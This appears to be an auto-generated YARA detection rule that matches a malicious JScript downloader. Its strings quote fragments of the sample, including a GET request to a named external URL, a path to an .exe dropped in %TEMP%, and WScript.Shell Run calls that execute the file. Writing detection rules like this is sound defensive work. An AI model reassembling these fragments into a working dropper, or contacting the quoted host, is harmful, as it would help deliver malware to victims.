rule sig_20160328_8d142b153022d34f87e65f724b3b7663 {
  meta:
    description = "datamaliciousorder - file 20160328_8d142b153022d34f87e65f724b3b7663.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "362b2abfaa22f7e188fe9618b18a769802ab21a35186c3bdd7c17604f0abe3db"

  strings:
    $s1  = "function Gbjsv() {return Iposfltg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"A6nIMlY7KFOdsaK.exe\";};" fullword ascii
    $s2  = "do {WScript[Snoxdj](Bqbmghzfl() * 11)} while (Pvzzxf[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Iposfltg = function Cuonhnhgv() {return WScript[Bsdhyl](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Qmlis(Jcsvdbxp, Zdjftci){return Jcsvdbxp - Zdjftci;};" fullword ascii
    $s5  = "Pvzzxf[Rsbfs](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s6  = "function Qdesid() {return ((Akmxl == true) && (Akmxl == Xbafkgmr)) ? 1 : Wvhjszmnc;};" fullword ascii
    $s7  = "function Nplzybn(Oejewt){Iposfltg[\"Run\"](Oejewt, Wvhjszmnc, Wvhjszmnc);};" fullword ascii
    $s8  = "function Ulcdtuxoat()" fullword ascii
    $s9  = " while (Eauszzv){" fullword ascii
    $s10 = "Xbafkgmr = true; " fullword ascii
    $s11 = "var Xbafkgmr = false;" fullword ascii
    $s12 = "Akmxl = true; " fullword ascii
    $s13 = "function Bqbmghzfl(){return 22;};" fullword ascii
    $s14 = "function Dhbzwau(){return Bsdhyl;};" fullword ascii
    $s15 = "return Qmlis(Nwbrhkj, Wfbhxvgaeg);" fullword ascii
    $s16 = "function Ezzhq(){return Mrrfh;};" fullword ascii
    $s17 = "var Foykufy = false;" fullword ascii
    $s18 = "var Akmxl = false;" fullword ascii
    $s19 = "function Jisssrlmvm(Heopl) {var Qvxmxgdfkm = (1, 2, 3, 4, 5, Heopl); return Qvxmxgdfkm;};" fullword ascii
    $s20 = "var Novranyg = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}